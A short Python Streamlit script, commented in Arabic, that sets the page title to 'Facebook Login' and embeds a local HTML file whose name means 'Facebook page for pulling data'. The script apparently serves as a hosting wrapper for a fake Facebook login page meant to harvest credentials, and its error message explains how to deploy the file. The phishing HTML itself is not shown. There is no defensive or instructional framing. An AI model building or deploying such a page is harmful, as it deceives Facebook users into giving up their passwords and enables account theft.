import streamlit as st
import streamlit.components.v1 as components

# 1. إعدادات الصفحة
st.set_page_config(page_title="Facebook Login", layout="centered")

# 2. قراءة ملف الـ HTML وتخزينه في متغير
try:
    with open("صفحه فيس لسحب البيانات.html", "r", encoding="utf-8") as f:
        html_code_from_file = f.read()
    
    # 3. عرض الصفحة (الحل هنا: نمرر المتغير مباشرة كأول قيمة)
    components.html(html_code_from_file, height=800, scrolling=True)

except FileNotFoundError:
    st.error("⚠️ ملف الـ HTML غير موجود! تأكد أن اسمه مطابق تماماً لما هو مكتوب في الكود وارفعه بجانب ملف البايثون.")
